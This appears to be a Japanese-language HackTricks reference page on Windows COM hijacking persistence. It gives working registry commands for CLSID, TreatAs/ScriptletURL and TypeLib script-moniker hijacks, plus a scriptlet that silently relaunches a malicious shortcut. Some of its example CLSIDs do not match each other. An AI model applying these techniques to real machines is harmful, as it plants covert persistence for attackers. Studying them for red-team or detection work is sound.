# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 存在しない COM コンポーネントの検索

ユーザーは HKCU の値を変更できるため、**COM Hijacking** は **persistence mechanism** として使われる可能性があります。`procmon` を使うと、まだ存在しないが攻撃者が作成できるような検索された COM レジストリを簡単に見つけられます。典型的なフィルタ:

- **RegOpenKey** 操作。
- _Result_ が **NAME NOT FOUND** のもの。
- _Path_ が **InprocServer32** で終わるもの。

調査時の有用なバリエーション:

- 欠落している **`LocalServer32`** キーも確認してください。いくつかの COM クラスはプロセス外のサーバーで、DLL の代わりに攻撃者制御の EXE を起動します。
- `InprocServer32` に加えて **`TreatAs`** と **`ScriptletURL`** のレジストリ操作も検索してください。最近の検出ルールやマルウェア解析でこれらがよく指摘されるのは、通常の COM 登録よりもはるかに稀で、シグナルが高いからです。
- 登録を HKCU にクローンする際には、元の `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` から正当な **`ThreadingModel`** をコピーしてください。間違ったモデルを使うとアクティベーションが失敗し、ハイジャックが目立つことが多いです。
- 64-bit システムでは 64-bit と 32-bit の両方のビューを確認してください（`procmon.exe` vs `procmon64.exe`、`HKLM\Software\Classes` と `HKLM\Software\Classes\WOW6432Node`）。32-bit アプリケーションは別の COM 登録を参照する可能性があります。

どの存在しない COM をなりすますか決めたら、次のコマンドを実行してください。_数秒ごとに読み込まれる COM をなりすます場合は、過剰になり得るため注意してください。_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows TasksはCustom Triggersを使ってCOM objectsを呼び出します。Task Schedulerを通じて実行されるため、いつトリガーされるかを予測しやすくなります。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

出力を確認すると、例えば**ユーザーがログインするたびに**実行されるものを選べます。

次にCLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** を **HKEY\CLASSES\ROOT\CLSID** と HKLM および HKCU で検索すると、通常その値は HKCU には存在しないことが分かります。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
その後、HKCU のエントリを作成するだけで、ユーザーがログインするたびに backdoor が実行されます。

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` はある CLSID を別のものとしてエミュレートできます。攻撃の観点では、元の CLSID をそのままにして、`scrobj.dll` を指すユーザー毎の二つ目の CLSID を作成し、実際の COM オブジェクトを `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` で悪意のあるものにリダイレクトできます。

これは以下のような場合に有用です:

- ターゲットアプリケーションが既にログオン時またはアプリ起動時に安定した CLSID をインスタンス化している場合
- 元の `InprocServer32` を置き換える代わりにレジストリのみでリダイレクトしたい場合
- `ScriptletURL` 値を介してローカルまたはリモートの `.sct` スクリプトレットを実行したい場合

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
注意:

- `scrobj.dll` は `ScriptletURL` 値を読み取り、参照された `.sct` を実行するため、ペイロードをローカルファイルとして保持するか、HTTP/HTTPS 経由でリモートから取得できます。
- `TreatAs` は、元の COM 登録が HKLM に完全かつ安定している場合に特に便利です。ツリー全体をミラーリングする代わりに、少量のユーザーごとのリダイレクトで済みます。
- 自然なトリガーを待たずに検証するには、対象クラスが STA アクティベーションをサポートしていれば、`rundll32.exe -sta <ProgID-or-CLSID>` で偽の ProgID/CLSID を手動でインスタンス化できます。

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) は COM インターフェースを定義し、`LoadTypeLib()` を通じて読み込まれます。COM サーバがインスタンス化されると、OS は `HKCR\TypeLib\{LIBID}` 以下のレジストリキーを参照して関連する TypeLib を読み込むことがあります。TypeLib のパスが **moniker**（例: `script:C:\...\evil.sct`）に置き換えられていると、TypeLib が解決される際に Windows はその scriptlet を実行します — これにより、一般的なコンポーネントが触れられたときに起動するステルス性の高い persistence が得られます。

This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).

### Steps (PowerShell)

1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) ユーザーごとの TypeLib パスをローカルの scriptlet に `script:` モニカーで向ける（管理者権限不要）:
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 最小限の JScript `.sct` を配置し、主要な payload（例: 初期チェーンで使用された `.lnk`）を再実行する:
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) トリガー – IE を開くこと、WebBrowser control を埋め込んだアプリケーションを開くこと、あるいは通常の Explorer の操作でさえ TypeLib をロードして scriptlet を実行し、logon/reboot 時にチェーンを再度有効化します。

クリーンアップ
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
注意事項
- 同じロジックは他の高頻度の COM コンポーネントにも適用できます; まず `HKCR\CLSID\{CLSID}\TypeLib` から実際の `LIBID` を解決してください。
- 64-bit システムでは、64-bit のクライアント向けに `win64` サブキーを追加することもできます。

## 参考資料

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
